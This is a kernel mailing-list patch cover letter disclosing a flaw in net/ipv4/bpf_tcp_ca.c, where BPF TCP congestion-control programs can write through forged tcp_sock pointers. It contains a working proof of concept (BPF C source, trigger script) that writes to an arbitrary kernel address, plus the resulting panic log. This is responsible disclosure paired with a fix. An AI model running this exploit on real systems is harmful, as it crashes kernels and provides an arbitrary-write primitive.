Received: from mail-dy1-f182.google.com (mail-dy1-f182.google.com [74.125.82.182])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id B924547206F
	for <bpf@vger.kernel.org>; Wed, 14 Oct 2026 11:58:11 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.82.182
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1791979093; cv=none; b=so2qbKJgwncJlSLuVXMpVv248KnGYtaGhS3fQQJpxivrBg3T5qehiLpl3Cg9tV/zzTri+88FNfAaVJlJYuT1RHf8ke5wJYJq4k4GGIbIyNBIpvWdrJQOVkFsITnzjs26ROJI6M+LBJOmaH0GYJOP/2MCAz966JxaSf4JCGbEphs=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1791979093; c=relaxed/simple;
	bh=fN90NoktBZxvWdW7c2Pd81oD1LmhsKp4TuYRHks3dis=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=Z7T2GRapMbxI0aClu5y71IKKWbs2ntMjROUw1rvzOKBIGnFI83rlr1ut2bGiMBFwmnFl1N0j3kBtYqSawUr9LPpy1AKcbiAM7VkilHFbYiFwt7yHwmUpA6Li6PK4iDCSw+w39fNdYj+Zb2e2VsE1Lwx6FgLzEW0zCAxOhpfNQ3Y=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=IzEknwKR; arc=none smtp.client-ip=74.125.82.182
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="IzEknwKR"
Received: by mail-dy1-f182.google.com with SMTP id 5a478bee46e88-35d7fa491deso598800eec.1
        for <bpf@vger.kernel.org>; Wed, 14 Oct 2026 04:58:11 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1791979091; x=1792583891; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=xPru/NnWWFQNbeuTwcG8xYtjhV3tu9JBcVGwz1PvuPU=;
        b=IzEknwKRNaASG8JUVjXWCmDQJPBV1vKJK/maU5x+oC0iqEFoO/pj5u46+s/i0ekyb3
         uq7nnoz8ZGmhQirVp8W9dxGSHhuR6yxOUy81uGfPug78nVmQVqg/KAa76+DjBzN9Qlxq
         Aeei8Sh6oXA7xakg78wSmwK3OxnVlJ0Vu8v1XyWkSmRZuKdR3WKPu1zdsLUn/HlP0YkS
         u0HimeIq2XdIGi24SEiqB3Ed4RrPbpRTEih/ydQDPRZtlWqhibStq2Y7SEMl4SveZ/RA
         2yx68+2sQJJdZvbpFFE+YYo8DKN5K9jSxZUQfBT259U8U7tbbUXucCkPDSL9O8GB+gdQ
         trTA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1791979091; x=1792583891;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=xPru/NnWWFQNbeuTwcG8xYtjhV3tu9JBcVGwz1PvuPU=;
        b=hr5vAHyRHSOH+mdnP2w/eRhXEBaDM9XGn6FBwOzc3fz/pf+LMrKaZMNAqVmqekH6rt
         pAAwYZhW7MjM0sbiILuHw+boMo5CKyHK77ugdRDCNH7P2Ntv4I1Ao0ruW3xN1uahCWVP
         J/2HxhD7u/Al48JL9NWhmdVQ73bPrc7Wvzqm+nQTPTIwOvMe7h087cbFnHL74BpIZox8
         3tH10d5m6zMwpH2pUkxudVr9xa1Uf53gYj8Q3xJzNeTX8+WBlLf95dui19J6WwVhztZ8
         I6OEscfB7hs1b5oNXE1q6GQftTkyMOzMd/yJNBFgd7amoiyH1YMPI7ay9AZ2KMKEkoV/
         GUfQ==
X-Forwarded-Encrypted: i=1; AKwUvBxDDn1faI/uv8hPPwlDLrKMqlBa40Oo9YnNbeMcPWfcGz7Gcig07yCuX3Ff110GS4exPm4=@vger.kernel.org
X-Gm-Message-State: AFq9FYLiKoDNRRS8Esb1Ra0dVXvf0IRMoIpkY+zGcDuX1HSj/dmdR2nn
	AbdC85ixE1LQ/tiBoGIWPCEPK5eraNJQwhB75tXvbq4xEPwOP5TFdJ/uhd613hyvnyrD
X-Gm-Gg: AYBFou2NlWDijTK2R4vABc19i3uCHs+PSM5AOMo29xvybwIZ85OZMjSjKDAtkoxCUP7
	kq4Tr0Y8z0zJOwLlVI53sTHXcSMB20Ia0ofDFnTaQsQQNY9Yh381dBi6iaX1cR1OiceqIofW+0E
	3bQGgenE47N7r4Csz/d1FFhz+otvKa66Dz3H6PVt8TKp0+w/KrNxDrDMiBVREMugfLf12Sjtkd3
	5Od2y54T4mo56zc8gMnxg/h+l76RYZG9+WhjKQDktxQ4tz44bPJIZ1WWjkd95CU0jq76WwcQPrk
	WEogEYuSjGlSd1bN53sHpGcT3qcF2+wUyXcnCCIg93yUsp9dVFAg7EzIOOF3DY7jP66+XXh1bRf
	Ri76AGSPxhWSblzpAk5tQCyw1cNHhfJedb9D8++IaOYqzFJr/DfadgOcRlnmUsg4PG6Gyi9DaY6
	SR/Aifl/w4RY4S1+1YlzdZlP5x2kibfvQQBFrjXjj36HLr2CzuT37qUSrFKGAdib+kIrpwEkpDD
	rFmANPT9tqwO2sGNA==
X-Received: by 2002:a05:7301:29b3:b0:351:77a3:55f1 with SMTP id 5a478bee46e88-3536c593e65mr22787371eec.19.1791979090340;
        Wed, 14 Oct 2026 04:58:10 -0700 (PDT)
Received: from Roxy.sysu.edu.cn ([2602:feda:30:ae86:295:dff:fe84:68f4])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-35977229a6esm37796346eec.8.2026.10.14.04.58.06
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 14 Oct 2026 04:58:09 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: netdev@vger.kernel.org,
	bpf@vger.kernel.org
Cc: davem@davemloft.net,
	edumazet@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	zhilinz@nebusec.ai,
	martin.lau@kernel.org,
	kafai.wan@linux.dev,
	yhs@fb.com,
	ast@kernel.org,
	vega@nebusec.ai
Subject: [PATCH net 0/1] bpf: reject unsafe pointers in TCP congestion control access
Date: Wed, 14 Oct 2026 19:57:56 +0800
Message-ID: <cover.1791978740.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.55.0
Precedence: bulk
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/ipv4/bpf_tcp_ca.c. A root user
with the capabilities required for BPF struct_ops can load a TCP
congestion-control program that writes through a forged tcp_sock pointer.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

bpf_rdonly_cast() returns a BTF pointer with PTR_UNTRUSTED. Generic BPF
store verification delegates writes through BTF pointers to the program
type's btf_struct_access callback. bpf_tcp_ca_btf_struct_access() checks
the BTF type and allowlisted member offset, but does not reject unsafe
pointer modifiers.

A BPF TCP struct_ops program can therefore cast a scalar address to a
struct tcp_sock pointer and write through an allowed member such as
sk_pacing_rate. The PoC biases the fake base so the store targets address
0x1000; the supplied KASAN log shows the resulting kernel-mode write
fault in the struct_ops init callback.

Reject pointers with unsafe modifiers before validating their BTF type
and member offset. Trusted struct_ops context pointers retain the
existing write access to the permitted TCP fields.

Reproducer:

    ./poc.sh

The supplied poc.bpf.o is used by the script. It requires bpftool and
Python 3 in the guest. We ran it as root in a 2 vCPU, 2 GB QEMU guest.

------BEGIN poc.bpf.c------

    // SPDX-License-Identifier: GPL-2.0

    #include "vmlinux.h"
    #include <bpf/bpf_core_read.h>
    #include <bpf/bpf_helpers.h>
    #include <bpf/bpf_tracing.h>
    #include "bpf_kfuncs.h"

    char LICENSE[] SEC("license") = "GPL";

    #define TARGET_ADDR 0x1000UL
    #define WRITE_VALUE 0x4141414141414141UL

    SEC("struct_ops/init")
    void BPF_PROG(poc_init, struct sock *sk)
    {
    	unsigned long base;
    	struct sock *fake;

    	base = TARGET_ADDR - __builtin_offsetof(struct sock, sk_pacing_rate);
    	fake = bpf_rdonly_cast((const void *)base,
    			       bpf_core_type_id_kernel(struct tcp_sock));
    	fake->sk_pacing_rate = WRITE_VALUE;
    }

    SEC("struct_ops/cong_avoid")
    void BPF_PROG(poc_cong_avoid, struct sock *sk, u32 ack, u32 acked)
    {
    }

    SEC("struct_ops/ssthresh")
    u32 BPF_PROG(poc_ssthresh, struct sock *sk)
    {
    	return 0;
    }

    SEC("struct_ops/undo_cwnd")
    u32 BPF_PROG(poc_undo_cwnd, struct sock *sk)
    {
    	return 0;
    }

    SEC(".struct_ops")
    struct tcp_congestion_ops poc_ca = {
    	.init = (void *)poc_init,
    	.cong_avoid = (void *)poc_cong_avoid,
    	.ssthresh = (void *)poc_ssthresh,
    	.undo_cwnd = (void *)poc_undo_cwnd,
    	.name = "k9v_poc",
    };

------END poc.bpf.c--------

------BEGIN bpf_kfuncs.h------

    #ifndef __POC_BPF_KFUNCS_H
    #define __POC_BPF_KFUNCS_H

    extern void *bpf_rdonly_cast(const void *obj, __u32 btf_id) __ksym __weak;

    #endif

------END bpf_kfuncs.h--------

------BEGIN poc.sh------

    #!/bin/sh
    set -eux

    DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
    cd "$DIR"

    if [ ! -f poc.bpf.o ]; then
    	if command -v clang >/dev/null 2>&1; then
    		make clean
    		make
    	else
    		echo "missing poc.bpf.o and no clang available to rebuild it" >&2
    		exit 1
    	fi
    fi

    bpftool struct_ops register ./poc.bpf.o

    python3 - <<'PY'
    import socket
    import threading
    import time

    ALG = b"k9v_poc"
    ready = threading.Event()
    port_box = {}


    def server():
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("127.0.0.1", 0))
        port_box["port"] = srv.getsockname()[1]
        srv.listen(1)
        ready.set()
        conn, _ = srv.accept()
        time.sleep(5)
        conn.close()
        srv.close()


    threading.Thread(target=server, daemon=True).start()
    ready.wait()

    cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cli.connect(("127.0.0.1", port_box["port"]))
    cli.setsockopt(socket.IPPROTO_TCP, socket.TCP_CONGESTION, ALG)
    PY

------END poc.sh--------

----BEGIN crash log----

[  900.010015][T10750] BUG: unable to handle page fault for address: 0000000000001000
[  900.010735][T10750] #PF: supervisor write access in kernel mode
[  900.011201][T10750] #PF: error_code(0x0002) - not-present page
[  900.011675][T10750] PGD 10f17b067 P4D 10f17b067 PUD 1121c2067 PMD 0
[  900.012209][T10750] Oops: Oops: 0002 [#1] PREEMPT SMP KASAN NOPTI
[  900.012693][T10750] CPU: 2 UID: 0 PID: 10750 Comm: python3 Not tainted 6.12.95 #2
[  900.013186][T10750] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  900.013972][T10750] RIP: 0010:bpf_prog_861704879f83f62f_poc_init+0x2b/0x38
[  900.014455][T10750] Code: 0f 1e fa 0f 1f 44 00 00 0f 1f 00 55 48 89 e5 f3 0f 1e fa bf 90 0c 00 00 be 85 ab 00 00 48 89 f8 48 bf 41 41 41 41 41 41 41 41 <48> 89 b8 70 03 00 00 c9 e9 4b 5e 6f ea cc cc cc cc cc cc cc cc cc
[  900.015700][T10750] RSP: 0018:ffffc900066dfb58 EFLAGS: 00010202
[  900.016102][T10750] RAX: 0000000000000c90 RBX: 0000000000000001 RCX: 0000000000000000
[  900.016617][T10750] RDX: 1ffff92000cdbf6e RSI: 000000000000ab85 RDI: 4141414141414141
[  900.017128][T10750] RBP: ffffc900066dfb58 R08: 0000000000000000 R09: fffffbfff2c69990
[  900.017641][T10750] R10: ffffffff9634cc87 R11: 0000000000000002 R12: ffff88810b72a278
[  900.018210][T10750] R13: ffff88801d8fc340 R14: ffff88810b72a278 R15: ffff88810b72a2a8
[  900.018843][T10750] FS:  00007f2b2a2d8780(0000) GS:ffff888118b00000(0000) knlGS:0000000000000000
[  900.019539][T10750] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  900.020009][T10750] CR2: 0000000000001000 CR3: 000000007cca4000 CR4: 0000000000750ef0
[  900.020633][T10750] PKRU: 55555554
[  900.020913][T10750] Call Trace:
[  900.021183][T10750]  <TASK>
[  900.021434][T10750]  bpf__tcp_congestion_ops_init+0x47/0xa7
[  900.021880][T10750]  tcp_init_congestion_control+0xa7/0x3b0
[  900.022412][T10750]  tcp_set_congestion_control+0x6a9/0x7c0
[  900.022838][T10750]  do_tcp_setsockopt+0x5c0/0x2170
[  900.023230][T10750]  ? __pfx_do_tcp_setsockopt+0x10/0x10
[  900.023579][T10750]  ? __pfx___might_resched+0x10/0x10
[  900.024056][T10750]  ? srso_alias_return_thunk+0x5/0xfbef5
[  900.024523][T10750]  ? aa_sk_perm+0x1d8/0x8d0
[  900.024956][T10750]  ? __pfx___lock_acquire+0x10/0x10
[  900.025389][T10750]  ? __pfx_aa_sk_perm+0x10/0x10
[  900.025777][T10750]  ? srso_alias_return_thunk+0x5/0xfbef5
[  900.026212][T10750]  ? srso_alias_return_thunk+0x5/0xfbef5
[  900.026662][T10750]  ? find_held_lock+0x2d/0x110
[  900.027002][T10750]  do_sock_setsockopt+0x1b8/0x3b0
[  900.046958][T10750] Kernel panic - not syncing: Fatal exception
[  900.047768][T10750] Kernel Offset: disabled
[  900.048106][T10750] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  bpf: reject unsafe pointers in TCP congestion control access

 net/ipv4/bpf_tcp_ca.c | 5 +++++
 1 file changed, 5 insertions(+)

-- 
2.55.0

